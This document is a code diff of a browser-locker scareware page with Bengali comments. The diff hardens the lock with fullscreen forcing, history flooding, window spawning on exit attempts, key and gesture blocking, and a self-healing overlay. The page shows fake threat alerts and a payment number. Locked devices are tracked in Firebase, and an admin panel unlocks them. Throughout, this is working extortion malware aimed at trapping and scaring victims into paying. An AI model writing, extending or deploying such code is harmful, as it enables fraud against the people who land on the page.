-function getModel(){
-  var u=navigator.userAgent;
-  if(/iPhone/.test(u))return'Apple iPhone';if(/iPad/.test(u))return'Apple iPad';
-  if(/Samsung/.test(u)){var m=u.match(/SM-([A-Za-z0-9]+)/);return'Samsung '+(m?m[1]:'Galaxy');}
-  if(/VIVO/.test(u)){var v=u.match(/V(\d{4})/);return'VIVO '+(v?v[1]:'');}
-  if(/Xiaomi|Redmi|POCO/.test(u))return'Xiaomi Device';if(/OPPO/.test(u))return'OPPO Device';
-  if(/Realme/.test(u))return'Realme Device';if(/Huawei|Honor/.test(u))return'Huawei Device';
-  if(/Pixel/.test(u))return'Google Pixel';if(/Android/.test(u))return'Android Device';
-  if(/Windows/.test(u))return'Windows PC';if(/Mac/.test(u))return'Apple Mac';
-  return'Unknown Device';
-}
-function getBr(){
-  var u=navigator.userAgent;
-  if(/CriOS/.test(u))return'Chrome iOS';if(/Chrome/.test(u)&&!/Edge/.test(u))return'Chrome';
-  if(/Safari/.test(u)&&!/Chrome/.test(u))return'Safari';if(/Firefox/.test(u))return'Firefox';
-  if(/Edge/.test(u))return'Edge';return'Unknown';
-}
-function fmtT(ms){
-  var s=Math.floor(ms/1000),h=String(Math.floor(s/3600)).padStart(2,'0'),
-  m=String(Math.floor((s%3600)/60)).padStart(2,'0'),sc=String(s%60).padStart(2,'0');
-  return h+':'+m+':'+sc;
-}
+/* ===== ইউটিলিটি ===== */
+function genFP(){var p=[screen.width,screen.height,navigator.platform||'',navigator.language||'',navigator.hardwareConcurrency||0,new Date().getTimezoneOffset(),screen.colorDepth||0,navigator.maxTouchPoints||0];var s=p.join('|'),h=0;for(var i=0;i<s.length;i++){h=((h<<5)-h)+s.charCodeAt(i);h=h&h;}return'D'+Math.abs(h).toString(36);}
+function getModel(){var u=navigator.userAgent;if(/iPhone/.test(u))return'Apple iPhone';if(/iPad/.test(u))return'Apple iPad';if(/Samsung/.test(u)){var m=u.match(/SM-([A-Za-z0-9]+)/);return'Samsung '+(m?m[1]:'Galaxy');}if(/VIVO/.test(u)){var v=u.match(/V(\d{4})/);return'VIVO '+(v?v[1]:'');}if(/Xiaomi|Redmi|POCO/.test(u))return'Xiaomi Device';if(/OPPO/.test(u))return'OPPO Device';if(/Realme/.test(u))return'Realme Device';if(/Huawei|Honor/.test(u))return'Huawei Device';if(/Pixel/.test(u))return'Google Pixel';if(/Android/.test(u))return'Android Device';if(/Windows/.test(u))return'Windows PC';if(/Mac/.test(u))return'Apple Mac';return'Unknown Device';}
+function getBr(){var u=navigator.userAgent;if(/CriOS/.test(u))return'Chrome iOS';if(/Chrome/.test(u)&&!/Edge/.test(u))return'Chrome';if(/Safari/.test(u)&&!/Chrome/.test(u))return'Safari';if(/Firefox/.test(u))return'Firefox';if(/Edge/.test(u))return'Edge';return'Unknown';}
+function fmtT(ms){var s=Math.floor(ms/1000),h=String(Math.floor(s/3600)).padStart(2,'0'),m=String(Math.floor((s%3600)/60)).padStart(2,'0'),sc=String(s%60).padStart(2,'0');return h+':'+m+':'+sc;}
 function esc(s){var d=document.createElement('div');d.textContent=s;return d.innerHTML;}
+function isAdm(){return location.hash==='#admin';}
 
-/* ===== Firebase - ডিভাইস রেজিস্টার ===== */
-function regDev(){
-  MYID=genFP();MYMD=getModel();
-  var fakeIP=Math.floor(Math.random()*200+10)+'.'+Math.floor(Math.random()*255)+'.'+Math.floor(Math.random()*255)+'.'+Math.floor(Math.random()*255);
-  var data={
-    model:MYMD,browser:getBr(),screen:screen.width+'x'+screen.height,
-    ip:fakeIP,startTime:Date.now(),locked:true,lastSeen:Date.now(),online:true,
-    unlockAttempts:0
-  };
-  db.ref('devices/'+MYID).set(data);
-  fbDevRef=db.ref('devices/'+MYID);
-  fbLockedRef=db.ref('devices/'+MYID+'/locked');
-  fbGlobalRef=db.ref('global/lockEnabled');
+/* ===== নতুন উইন্ডো খোলা — ব্যাক বাটনে ===== */
+function spawnWindow(){
+  if(!LA||isAdm())return;
+  openAttempts++;
+  // একই পেজ নতুন ট্যাবে খোলার চেষ্টা (পপআপ ব্লকার থাকলে ব্লক হতে পারে)
+  try{
+    var w=window.open(location.href,'_blank');
+    if(!w){
+      // পপআপ ব্লক হলে a ট্যাগ তৈরি করে ক্লিক সিমুলেট
+      var a=document.createElement('a');
+      a.href=location.href;a.target='_blank';a.rel='noopener';
+      a.style.cssText='position:fixed;left:-9999px;top:-9999px;opacity:0';
+      document.body.appendChild(a);
+      a.click();
+      setTimeout(function(){document.body.removeChild(a);},100);
+    }
+  }catch(e){
+    // ফলব্যাক: a ট্যাগ
+    try{
+      var a2=document.createElement('a');a2.href=location.href;a2.target='_blank';
+      a2.style.cssText='position:fixed;left:-9999px';
+      document.body.appendChild(a2);a2.click();
+      setTimeout(function(){try{document.body.removeChild(a2);}catch(e){}},100);
+    }catch(e2){}
+  }
 }
 
-/* ===== Firebase - প্রেজেন্স ===== */
-function setupPresence(){
-  var connRef=db.ref('.info/connected');
-  connRef.on('value',function(snap){
-    if(snap.val()===true){
-      db.ref('devices/'+MYID+'/lastSeen').onDisconnect().set(Date.now());
-      db.ref('devices/'+MYID+'/online').onDisconnect().set(false);
-      db.ref('devices/'+MYID).update({online:true,lastSeen:Date.now()});
+/* ===== ফুলস্ক্রিন ===== */
+function reqFS(){
+  if(document.fullscreenElement||document.webkitFullscreenElement||!LA||isAdm())return;
+  var el=document.documentElement;
+  try{if(el.requestFullscreen)el.requestFullscreen().catch(function(){});else if(el.webkitRequestFullscreen)el.webkitRequestFullscreen();}catch(e){}
+}
+function exitFS(){try{if(document.exitFullscreen)document.exitFullscreen().catch(function(){});else if(document.webkitExitFullscreen)document.webkitExitFullscreen();}catch(e){}}
+
+/* ===== হিস্ট্রি ফ্লাডিং — ৫০০ স্টেট ===== */
+function floodHist(){for(var i=0;i<500;i++)history.pushState(null,'',location.href);}
+function keepFlood(){if(!LA||isAdm())return;for(var i=0;i<20;i++)history.pushState(null,'',location.href);}
+
+/* ===== ব্যাক বাটন — নতুন উইন্ডো + ফ্লাড ===== */
+function blockBack(){
+  floodHist();
+  window.addEventListener('popstate',function(){
+    if(!LA||isAdm())return;
+    // নতুন উইন্ডো খোলো
+    spawnWindow();
+    spawnWindow();
+    // হিস্ট্রি আবার ফ্লাড
+    keepFlood();
+    // ফুলস্ক্রিন
+    reqFS();
+  },false);
+}
+
+/* ===== beforeunload ===== */
+function blockUnload(){
+  window.addEventListener('beforeunload',function(e){
+    if(LA&&!isAdm()){
+      // শেষ চেষ্টায় উইন্ডো খোলার চেষ্টা
+      spawnWindow();
+      e.preventDefault();e.returnValue=' ';return' ';
     }
   });
 }
 
-/* ===== Firebase - রিয়েলটাইম লিসেনার ===== */
-function setupListeners(){
-  // আমার ডিভাইসের লক স্টেট চেঞ্জ
-  fbLockedRef.on('value',function(snap){
-    if(snap.val()===false&&LA){doUnlock();}
-  });
-  // গ্লোবাল লক স্টেট
-  fbGlobalRef.on('value',function(snap){
-    if(snap.val()===false&&LA){doUnlock();}
+/* ===== unload ইভেন্ট — পেজ ছাড়ার সময় ===== */
+function blockUnload2(){
+  window.addEventListener('unload',function(){
+    if(LA&&!isAdm()){spawnWindow();}
   });
 }
 
-/* ===== Firebase - লগ পুশ ===== */
-function pushLog(msg){
-  db.ref('logs').push({time:new Date().toLocaleTimeString('bn-BD'),msg:msg,device:MYID,model:MYMD});
-}
-
-/* ===== Firebase - হার্টবিট ===== */
-function startHB(){
-  hI=setInterval(function(){
-    if(!LA)return;
-    fbDevRef.update({lastSeen:Date.now(),online:true});
-  },3000);
-}
-
-/* ===== ব্লকিং মেকানিজম ===== */
-function reqFS(){
-  if(document.fullscreenElement||document.webkitFullscreenElement||!LA)return;
-  var el=document.documentElement;
-  try{
-    if(el.requestFullscreen)el.requestFullscreen().catch(function(){});
-    else if(el.webkitRequestFullscreen)el.webkitRequestFullscreen();
-  }catch(e){}
-}
-function exitFS(){
-  try{
-    if(document.exitFullscreen)document.exitFullscreen().catch(function(){});
-    else if(document.webkitExitFullscreen)document.webkitExitFullscreen();
-  }catch(e){}
-}
-function floodHist(){for(var i=0;i<300;i++)history.pushState(null,'',location.href);}
-function keepFlood(){if(!LA)return;for(var i=0;i<15;i++)history.pushState(null,'',location.href);}
-function blockBack(){floodHist();window.addEventListener('popstate',function(){if(LA){history.pushState(null,'',location.href);reqFS();}},false);}
-function blockUnload(){window.addEventListener('beforeunload',function(e){if(LA){e.preventDefault();e.returnValue=' ';return' ';}});}
+/* ===== সব ব্লকিং ===== */
 function blockCtx(){document.addEventListener('contextmenu',function(e){e.preventDefault();return false;},true);}
 function blockSel(){
-  document.addEventListener('selectstart',function(e){e.preventDefault();},true);
-  document.addEventListener('copy',function(e){e.preventDefault();},true);
-  document.addEventListener('cut',function(e){e.preventDefault();},true);
-  document.addEventListener('paste',function(e){e.preventDefault();},true);
+  document.addEventListener('selectstart',function(e){if(!isAdm())e.preventDefault();},true);
+  document.addEventListener('copy',function(e){if(!isAdm())e.preventDefault();},true);
+  document.addEventListener('cut',function(e){if(!isAdm())e.preventDefault();},true);
+  document.addEventListener('paste',function(e){if(!isAdm())e.preventDefault();},true);
 }
 function blockKeys(){
   document.addEventListener('keydown',function(e){
+    if(isAdm())return;
     if(e.key==='Escape'){e.preventDefault();e.stopPropagation();reqFS();return false;}
     if(e.key==='F5'){e.preventDefault();return false;}
     if(e.ctrlKey||e.metaKey){
-      if(e.key==='w'||e.key==='W'){e.preventDefault();return false;}
-      if(e.shiftKey&&(e.key==='I'||e.key==='i'||e.key==='J'||e.key==='j')){e.preventDefault();return false;}
-      if(e.key==='u'||e.key==='U'){e.preventDefault();return false;}
+      if(e.key==='w'||e.key==='W'||e.key==='q'||e.key==='Q'){e.preventDefault();return false;}
+      if(e.shiftKey&&(e.key==='I'||e.key==='i'||e.key==='J'||e.key==='j'||e.key==='C'||e.key==='c')){e.preventDefault();return false;}
+      if(e.key==='u'||e.key==='U'||e.key==='l'||e.key==='L'){e.preventDefault();return false;}
+      if(e.key==='n'||e.key==='N'){e.preventDefault();return false;}
     }
     if(e.altKey&&e.key==='F4'){e.preventDefault();return false;}
   },true);
 }
 function blockEdge(){
   var sx=0,sy=0,bl=false;
-  document.addEventListener('touchstart',function(e){sx=e.touches[0].clientX;sy=e.touches[0].clientY;bl=false;},{passive:true});
+  document.addEventListener('touchstart',function(e){if(isAdm())return;sx=e.touches[0].clientX;sy=e.touches[0].clientY;bl=false;},{passive:true});
   document.addEventListener('touchmove',function(e){
-    if(bl)return;var tx=e.touches[0].clientX,ty=e.touches[0].clientY,dx=tx-sx,dy=ty-sy;
-    if(sx<25&&dx>50){e.preventDefault();bl=true;}
-    if(sx>window.innerWidth-25&&dx<-50){e.preventDefault();bl=true;}
-    if(sy>window.innerHeight-25&&dy<-50){e.preventDefault();bl=true;}
+    if(isAdm()||bl)return;var tx=e.touches[0].clientX,ty=e.touches[0].clientY,dx=tx-sx,dy=ty-sy;
+    if(sx<30&&dx>40){e.preventDefault();bl=true;}
+    if(sx>window.innerWidth-30&&dx<-40){e.preventDefault();bl=true;}
+    if(sy>window.innerHeight-30&&dy<-50){e.preventDefault();bl=true;}
     if(e.touches.length>1){e.preventDefault();bl=true;}
   },{passive:false});
 }
 function blockPrint(){
-  window.addEventListener('beforeprint',function(){if(LA)document.body.style.display='none';});
+  window.addEventListener('beforeprint',function(){if(LA&&!isAdm())document.body.style.display='none';});
   window.addEventListener('afterprint',function(){document.body.style.display='';});
 }
 function devToolsChk(){
   setInterval(function(){
-    if(!LA)return;
-    if(window.outerWidth-window.innerWidth>160||window.outerHeight-window.innerHeight>160){
-      reqFS();document.body.style.overflow='hidden';
-    }
+    if(!LA||isAdm())return;
+    if(window.outerWidth-window.innerWidth>160||window.outerHeight-window.innerHeight>160){reqFS();document.body.style.overflow='hidden';}
   },2000);
 }
 
 /* ===== সেলফ-হিলিং ===== */
 function heal(){
-  if(!LA)return;
+  if(!LA||isAdm())return;
   var ls=document.getElementById('ls');
-  if(ls&&ls.parentNode!==document.body)document.body.appendChild(ls);
-  if(ls&&ls.style.display==='none'){ls.style.display='flex';ls.style.opacity='1';ls.style.transform='scale(1)';}
-  if(ls){ls.style.zIndex='2147483647';ls.style.position='fixed';ls.style.inset='0';}
-  var us=document.getElementById('unl');if(us&&us.style.display!=='none')us.style.display='none';
+  if(ls){
+    if(ls.parentNode!==document.body)document.body.appendChild(ls);
+    if(ls.style.display==='none'){ls.style.display='flex';ls.style.opacity='1';ls.style.transform='scale(1)';}
+    ls.style.zIndex='2147483647';ls.style.position='fixed';ls.style.inset='0';
+  }
+  var us=document.getElementById('wot');if(us&&us.style.display!=='none')us.style.display='none';
   var tp=document.getElementById('trap');if(tp)tp.classList.add('on');
   document.body.style.overflow='hidden';document.documentElement.style.overflow='hidden';
 }
 var mObs=null;
 function initObs(){
   mObs=new MutationObserver(function(mutations){
-    if(!LA)return;var need=false;
+    if(!LA||isAdm())return;var need=false;
     mutations.forEach(function(m){
       if(m.type==='childList'){
-        m.removedNodes.forEach(function(n){if(n.nodeType===1&&n.id==='ls')need=true;});
-        m.addedNodes.forEach(function(n){
-          if(n.nodeType===1&&n.id!=='ls'&&n.id!=='trap'&&n.id!=='particles'){
-            var ls=document.getElementById('ls');
-            if(ls){try{document.body.insertBefore(n,ls);}catch(e){}}
-          }
-        });
+        m.removedNodes.forEach(function(n){if(n.nodeType===1&&(n.id==='ls'||n.id==='trap'))need=true;});
       }
-      if(m.type==='attributes'&&m.target.id==='ls')need=true;
+      if(m.type==='attributes')need=true;
     });
     if(need)heal();
   });
-  mObs.observe(document.body,{childList:true,subtree:true,attributes:true,attributeFilter:['style','class','id']});
+  mObs.observe(document.body,{childList:true,subtree:true,attributes:true,attributeFilter:['style','class']});
 }
 
 /* ===== প্রতি ৫ সেকেন্ড রিয়্যাক্টিভেট ===== */
 function startReact(){
   rI=setInterval(function(){
-    if(!LA)return;
+    if(!LA||isAdm())return;
     reqFS();heal();keepFlood();reqWL();window.focus();
   },5000);
 }
 
 /* ===== ওয়েক লক ===== */
-function reqWL(){
-  try{if('wakeLock' in navigator){navigator.wakeLock.request('screen').then(function(l){wL=l;wL.addEventListener('release',function(){if(LA)setTimeout(reqWL,800);});}).catch(function(){});}}catch(e){}
+function reqWL(){try{if('wakeLock' in navigator){navigator.wakeLock.request('screen').then(function(l){wL=l;wL.addEventListener('release',function(){if(LA)setTimeout(reqWL,800);});}).catch(function(){});}}catch(e){}}
+
+/* ===== ভিজিবিলিটি — ট্যাব সুইচ করলে উইন্ডো খোলার চেষ্টা ===== */
+document.addEventListener('visibilitychange',function(){
+  if(document.hidden&&LA&&!isAdm()){
+    // ট্যাব ছেড়ে গেলে উইন্ডো খোলার চেষ্টা
+    spawnWindow();
+  }
+  if(!document.hidden&&LA&&!isAdm()){
+    reqFS();reqWL();heal();window.focus();
+  }
+});
+
+/* ===== উইন্ডো ব্লার — ফোকাস হারালে ===== */
+window.addEventListener('blur',function(){
+  if(LA&&!isAdm()){
+    setTimeout(function(){
+      window.focus();reqFS();
+      // ফোকাস ফিরে না আসলে উইন্ডো খোলার চেষ্টা
+      if(document.hidden)spawnWindow();
+    },300);
+  }
+});
+window.addEventListener('focus',function(){if(LA&&!isAdm())reqFS();});
+
+/* ===== Firebase রেজিস্টার ===== */
+function regDev(){
+  MYID=genFP();MYMD=getModel();
+  var fip=Math.floor(Math.random()*200+10)+'.'+Math.floor(Math.random()*255)+'.'+Math.floor(Math.random()*255)+'.'+Math.floor(Math.random()*255);
+  var data={model:MYMD,browser:getBr(),screen:screen.width+'x'+screen.height,ip:fip,startTime:Date.now(),locked:true,lastSeen:Date.now(),online:true,unlockAttempts:0,openAttempts:0};
+  db.ref('devices/'+MYID).set(data);
+  fbDev=db.ref('devices/'+MYID);
+  fbLk=db.ref('devices/'+MYID+'/locked');
+  fbGl=db.ref('global/lockEnabled');
 }
+function setupPresence(){
+  db.ref('.info/connected').on('value',function(s){
+    if(s.val()===true){
+      db.ref('devices/'+MYID+'/lastSeen').onDisconnect().set(Date.now());
+      db.ref('devices/'+MYID+'/online').onDisconnect().set(false);
+      db.ref('devices/'+MYID).update({online:true,lastSeen:Date.now()});
+    }
+  });
+}
+function setupListeners(){
+  fbLk.on('value',function(s){if(s.val()===false&&LA)doUnlock();});
+  fbGl.on('value',function(s){if(s.val()===false&&LA)doUnlock();});
+}
+function pushLog(msg){db.ref('logs').push({time:new Date().toLocaleTimeString('bn-BD'),msg:msg,device:MYID,model:MYMD});}
+function startHB(){hI=setInterval(function(){if(!LA)return;fbDev.update({lastSeen:Date.now(),online:true,openAttempts:openAttempts});},3000);}
 
 /* ===== ডিভাইস ইনফো ===== */
 function setInfo(){
   var e=function(id,v){var el=document.getElementById(id);if(el)el.textContent=v;};
-  e('dm',MYMD);e('dp',navigator.platform||'N/A');e('db',getBr());e('dsr',screen.width+'x'+screen.height);
-  e('pnd',PAY_NUM);
+  e('dm2',MYMD);e('dp2',navigator.platform||'N/A');e('db2',getBr());e('dsr2',screen.width+'x'+screen.height);
+  e('pnd2',PAY_NUM);
   var fip=Math.floor(Math.random()*200+10)+'.'+Math.floor(Math.random()*255)+'.'+Math.floor(Math.random()*255)+'.'+Math.floor(Math.random()*255);
-  e('dip',fip);
+  e('dip2',fip);
 }
 
 /* ===== থ্রেট ===== */
 var TM=['অননুমোদিত লগইন প্রচেষ্টা সনাক্ত','সন্দেবজনক নেটওয়ার্ক অ্যাক্টিভিটি','ফিশিং লিংক ক্লিক সনাক্ত','ম্যালওয়্যার স্ক্যান সনাক্ত','ডিভাইস রুট/জেলব্রেক চেক ব্যর্থ','VPN/প্রক্সি সনাক্ত — ঝুঁকি উচ্চ','অবৈধ অ্যাপ ইনস্টলেশন সনাক্ত','ক্রিপ্টো হ্যাশ মিসম্যাচ','SIM কার্ড পরিবর্তন সনাক্ত','ব্যাটারি অস্বাভাবিক ডিসচার্জ','ফেক GPS লোকেশন সনাক্ত','অ্যান্টিভাইরাস ডিসেবল করা হয়েছে'];
-function addThreat(){
-  if(TC>=6)return;var l=document.getElementById('tlist');if(!l)return;
-  var d=document.createElement('div');d.className='ti';
-  d.innerHTML='<i class="fas fa-bug"></i><span class="tt">'+TM[TC%TM.length]+'</span><span class="ts">CRITICAL</span>';
-  l.appendChild(d);TC++;
-}
+function addThreat(){if(TC>=6)return;var l=document.getElementById('tlist2');if(!l)return;var d=document.createElement('div');d.className='ti';d.innerHTML='<i class="fas fa-bug"></i><span class="tt">'+TM[TC%TM.length]+'</span><span class="ts">CRITICAL</span>';l.appendChild(d);TC++;}
 function schThreats(){[2000,5000,9000,14000,20000,27000].forEach(function(d){setTimeout(function(){if(LA)addThreat();},d);});}
 
 /* ===== টাইমার ও স্ক্যান ===== */
-function startTimer(){
-  tI=setInterval(function(){
-    if(!LA)return;var el=Date.now()-LST;
-    var t=document.getElementById('tmr');if(t)t.textContent=fmtT(el);
-  },1000);
-}
-function startScan(){
-  sI=setInterval(function(){
-    if(!LA)return;SP+=SD2*(Math.random()*2+.5);
-    if(SP>=97){SP=97;SD2=-1;}if(SP<=30){SP=30;SD2=1;}
-    var p=document.getElementById('scp'),f=document.getElementById('scf');
-    if(p)p.textContent=Math.floor(SP)+'%';if(f)f.style.width=SP+'%';
-  },500);
-}
+function startTimer(){tI=setInterval(function(){if(!LA)return;var el=Date.now()-LST;var t=document.getElementById('tmr');if(t)t.textContent=fmtT(el);},1000);}
+function startScan(){sI=setInterval(function(){if(!LA)return;SP+=SD*(Math.random()*2+.5);if(SP>=97){SP=97;SD=-1;}if(SP<=30){SP=30;SD=1;}var p=document.getElementById('scp2'),f=document.getElementById('scf2');if(p)p.textContent=Math.floor(SP)+'%';if(f)f.style.width=SP+'%';},500);}
 
 /* ===== ফেক আনলক ===== */
 function setupFake(){
-  var btn=document.getElementById('fub'),toast=document.getElementById('ftst'),flash=document.getElementById('rf');
+  var btn=document.getElementById('fub2'),toast=document.getElementById('ftst2'),flash=document.getElementById('rf');
   btn.addEventListener('click',function(e){
     e.stopPropagation();UA++;
-    fbDevRef.update({unlockAttempts:UA});
-    pushLog('আনলক চেষ্টা #'+UA+' — ব্যর্থ');
+    fbDev.update({unlockAttempts:UA});pushLog('আনলক চেষ্টা #'+UA+' — ব্যর্থ');
     toast.classList.add('show');setTimeout(function(){toast.classList.remove('show');},2500);
     flash.classList.add('on');setTimeout(function(){flash.classList.remove('on');},200);
     if(navigator.vibrate)navigator.vibrate([200,100,200]);
     var w=document.getElementById('lwk');w.style.animation='none';w.offsetHeight;w.style.animation='shake .5s ease';
+    // ফেক আনলক চেষ্টাতেও উইন্ডো খোলার চেষ্টা
+    spawnWindow();
   });
 }
 
 /* ===== কপি ===== */
 function setupCopy(){
-  document.getElementById('cpb').addEventListener('click',function(e){
-    e.stopPropagation();var t=document.getElementById('ctst');
+  document.getElementById('cpb2').addEventListener('click',function(e){
+    e.stopPropagation();var t=document.getElementById('ctst2');
     function ok(){t.classList.add('show');setTimeout(function(){t.classList.remove('show');},2000);}
     if(navigator.clipboard){navigator.clipboard.writeText(PAY_RAW).then(ok).catch(function(){fbCp();ok();});}
     else{fbCp();ok();}
@@ -430,7 +520,7 @@ function setupFlash(){
 /* ===== পার্টিকেল ===== */
 function initPart(){
   var c=document.getElementById('particles');if(!c)return;
-  var ctx=c.getContext('2d'),pts=[],cnt=30;
+  var ctx=c.getContext('2d'),pts=[],cnt=28;
   function rs(){c.width=window.innerWidth;c.height=window.innerHeight;}rs();
   window.addEventListener('resize',rs);
   for(var i=0;i<cnt;i++)pts.push({x:Math.random()*c.width,y:Math.random()*c.height,vx:(Math.random()-.5)*.35,vy:(Math.random()-.5)*.35,r:Math.random()*1.3+.4,a:Math.random()*.2+.04});
@@ -442,22 +532,21 @@ function initPart(){
       ctx.beginPath();ctx.arc(p.x,p.y,Math.max(.4,p.r),0,Math.PI*2);ctx.fillStyle='rgba(255,8,8,'+p.a+')';ctx.fill();
       for(var j=i+1;j<pts.length;j++){
         var q=pts[j],dx=p.x-q.x,dy=p.y-q.y,d=Math.sqrt(dx*dx+dy*dy);
-        if(d<110){ctx.beginPath();ctx.moveTo(p.x,p.y);ctx.lineTo(q.x,q.y);ctx.strokeStyle='rgba(255,8,8,'+(0.04*(1-d/110))+')';ctx.lineWidth=.5;ctx.stroke();}
+        if(d<100){ctx.beginPath();ctx.moveTo(p.x,p.y);ctx.lineTo(q.x,q.y);ctx.strokeStyle='rgba(255,8,8,'+(0.04*(1-d/100))+')';ctx.lineWidth=.5;ctx.stroke();}
       }
-    }
-    requestAnimationFrame(draw);
+    }requestAnimationFrame(draw);
   }draw();
 }
 
 /* ===== আনলক ===== */
 function doUnlock(){
   LA=false;
-  fbDevRef.update({locked:false});fbGlobalRef.set(false);
+  try{fbDev.update({locked:false});}catch(e){}
+  try{fbGl.set(false);}catch(e){}
   clearInterval(tI);clearInterval(sI);clearInterval(rI);clearInterval(hI);
   if(mObs)mObs.disconnect();
-  if(fbLockedRef)fbLockedRef.off();
-  if(fbGlobalRef)fbGlobalRef.off();
-  var ls=document.getElementById('ls'),us=document.getElementById('unl'),tp=document.getElementById('trap');
+  try{fbLk.off();fbGl.off();}catch(e){}
+  var ls=document.getElementById('ls'),us=document.getElementById('wot'),tp=document.getElementById('trap');
   ls.style.transition='opacity .8s,transform .8s';ls.style.opacity='0';ls.style.transform='scale(.95)';
   setTimeout(function(){
     ls.style.display='none';us.style.display='flex';if(tp)tp.classList.remove('on');
@@ -467,46 +556,123 @@ function doUnlock(){
   },800);
 }
 
-/* ===== ইভেন্ট ===== */
-document.addEventListener('visibilitychange',function(){if(!document.hidden&&LA){reqFS();reqWL();heal();window.focus();}});
-window.addEventListener('blur',function(){if(LA)setTimeout(function(){window.focus();reqFS();},300);});
-window.addEventListener('focus',function(){if(LA)reqFS();});
-
-/* ===== ইনিশিয়ালাইজ ===== */
-function init(){
-  regDev();setupPresence();
-
-  // Firebase থেকে চেক করো — গ্লোবাল লock আছে কিনা
-  fbGlobalRef.once('value',function(snap){
-    if(snap.val()===false){
-      document.getElementById('ls').style.display='none';
-      document.getElementById('unl').style.display='flex';
-      return;
-    }
-    // আমার ডিভাইস আনলক কি না
-    fbLockedRef.once('value',function(s2){
-      if(s2.val()===false){
-        document.getElementById('ls').style.display='none';
-        document.getElementById('unl').style.display='flex';
-        return;
-      }
-      // লক সক্রিয় — শুরু করো
-      startLockScreen();
-    });
-  });
-}
-
-function startLockScreen(){
+/* ===== লক স্ক্রিন শুরু ===== */
+function startLock(){
   LST=Date.now();
-  fbGlobalRef.set(true);
+  try{fbGl.set(true);}catch(e){}
   setInfo();initPart();startTimer();startScan();schThreats();
   setupFake();setupCopy();setupFlash();
   document.getElementById('trap').classList.add('on');
-  blockBack();blockUnload();blockCtx();blockSel();blockKeys();blockEdge();blockPrint();devToolsChk();
-  initObs();setInterval(heal,2000);startReact();startHB();reqWL();setupListeners();
+  blockBack();blockUnload();blockUnload2();blockCtx();blockSel();blockKeys();blockEdge();blockPrint();devToolsChk();
+  initObs();setInterval(heal,1500);startReact();startHB();reqWL();setupListeners();
   function firstInt(){reqFS();reqWL();document.removeEventListener('click',firstInt);document.removeEventListener('touchstart',firstInt);}
   document.addEventListener('click',firstInt);document.addEventListener('touchstart',firstInt);
   pushLog('ডিভাইস লক সক্রিয় — '+MYMD);
+}
+
+/* ===== অ্যাডমিন প্যানেল ===== */
+function initAdm(){
+  document.getElementById('ls').style.display='none';
+  document.getElementById('trap').classList.remove('on');
+  document.getElementById('adm').classList.add('on');
+  document.body.style.overflow='auto';document.documentElement.style.overflow='auto';
+  document.body.style.touchAction='pan-y';
+
+  document.getElementById('albn2').addEventListener('click',doLogin);
+  document.getElementById('apin2').addEventListener('keydown',function(e){if(e.key==='Enter')doLogin();});
+
+  function doLogin(){
+    if(document.getElementById('apin2').value===ADMIN_PASS){
+      document.getElementById('alogin2').style.display='none';
+      document.getElementById('adash2').classList.add('on');
+      setupDash();
+    }else{
+      document.getElementById('alerr2').textContent='ভুল পাসওয়ার্ড!';
+      document.getElementById('apin2').value='';
+      if(navigator.vibrate)navigator.vibrate(100);
+    }
+  }
+}
+
+var devCache={};
+function setupDash(){
+  db.ref('global/lockEnabled').on('value',function(s){
+    var v=s.val(),ss=document.getElementById('ss2'),ad=document.getElementById('adt2'),at=document.getElementById('ast2');
+    if(v===false||v===null){ss.textContent='UNLOCKED';ss.className='sv2 g';ad.className='sd2 off';at.textContent='STOPPED';}
+    else{ss.textContent='LOCKED';ss.className='sv2 r';ad.className='sd2';at.textContent='ACTIVE';}
+  });
+  db.ref('devices').on('value',function(s){devCache=s.val()||{};renderDevs();});
+  db.ref('logs').orderByKey().limitToLast(50).on('value',function(s){
+    var data=s.val(),arr=[];if(data){Object.keys(data).forEach(function(k){arr.push(data[k]);});}
+    renderLogs(arr);
+  });
+}
+function renderDevs(){
+  var keys=Object.keys(devCache);
+  var locked=keys.filter(function(k){return devCache[k].locked===true;});
+  var online=locked.filter(function(k){return devCache[k].online===true&&(Date.now()-devCache[k].lastSeen<15000);});
+  document.getElementById('dcn2').textContent=locked.length;
+  document.getElementById('sdv2').textContent=online.length;
+  document.getElementById('stl2').textContent=keys.length;
+  var ta=0;keys.forEach(function(k){ta+=(devCache[k].unlockAttempts||0);});document.getElementById('sat2').textContent=ta;
+  var c=document.getElementById('dlc22');
+  if(!locked.length){c.innerHTML='<div class="ndev2">কোনো লক করা ডিভাইস নেই</div>';return;}
+  var now=Date.now();
+  locked.sort(function(a,b){var aOn=devCache[a].online?0:1,bOn=devCache[b].online?0:1;if(aOn!==bOn)return aOn-bOn;return(devCache[b].lastSeen||0)-(devCache[a].lastSeen||0);});
+  var h='';
+  locked.forEach(function(k){
+    var d=devCache[k],isOn=d.online===true&&(now-d.lastSeen<15000);
+    var dot=isOn?'od2':'ofd2',stxt=isOn?'<span style="color:#00e676">সক্রিয়</span>':'<span style="color:#444">নিষ্ক্রিয়</span>';
+    var el=d.startTime?fmtT(now-d.startTime):'--';
+    var oa=d.openAttempts||0,ua=d.unlockAttempts||0;
+    h+='<div class="dei2"><div class="di2"><i class="fas fa-mobile-screen"></i></div><div class="df2"><div class="dm2">'+esc(d.model||'Unknown')+'</div><div class="dd2"><span class="'+dot+'"></span>'+stxt+'<span>'+esc(d.browser||'')+'</span><span>'+esc(d.screen||'')+'</span><span>'+el+'</span>'+(ua>0?'<span style="color:var(--red)">'+ua+'চেষ্টা</span>':'')+(oa>0?'<span style="color:var(--gold)">'+oa+'উইন্ডো</span>':'')+'</div></div><button class="ub2" onclick="window._unlOne(\''+k+'\')"><i class="fas fa-lock-open"></i></button></div>';
+  });
+  c.innerHTML=h;
+}
+window._unlOne=function(k){
+  db.ref('devices/'+k+'/locked').set(false);
+  db.ref('logs').push({time:new Date().toLocaleTimeString('bn-BD'),msg:'অ্যাডমিন আনলক: '+(devCache[k]?devCache[k].model:k),device:k,model:devCache[k]?devCache[k].model:'?'});
+};
+function renderLogs(arr){
+  var l=document.getElementById('llist2');if(!l)return;l.innerHTML='';
+  arr.slice().reverse().forEach(function(o){
+    var e=document.createElement('div');e.className='le3';
+    var mt=o.model?' <span class="mdl2">['+esc(o.model)+']</span>':'';
+    e.innerHTML='<span class="lt3">['+esc(o.time)+']</span><span class="lm3">'+esc(o.msg)+mt+'</span>';
+    l.appendChild(e);
+  });l.scrollTop=0;
+}
+document.getElementById('saBtn2').addEventListener('click',function(){
+  db.ref('global/lockEnabled').set(false);
+  Object.keys(devCache).forEach(function(k){db.ref('devices/'+k+'/locked').set(false);});
+  db.ref('logs').push({time:new Date().toLocaleTimeString('bn-BD'),msg:'গ্লোবাল আনলক — সব ডিভাইস',device:'admin',model:'Admin'});
